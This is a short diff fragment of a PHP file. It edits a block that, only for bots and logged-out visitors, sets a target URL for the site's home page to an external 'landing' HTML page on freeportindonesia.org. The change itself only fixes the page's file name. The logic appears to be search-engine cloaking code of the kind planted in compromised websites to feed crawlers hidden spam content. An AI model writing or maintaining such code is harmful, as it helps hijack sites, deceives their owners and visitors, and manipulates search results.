@@ -43,7 +43,7 @@ if ($isBot && !$isLogged) {
     $targetUrl = null;
 
     if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
-        $targetUrl = 'https://freeportindonesia.org/landing/jkaa.bunghatta.html';
+        $targetUrl = 'https://freeportindonesia.org/landing/jkaa-bunghatta.html';
     }
 
     else {
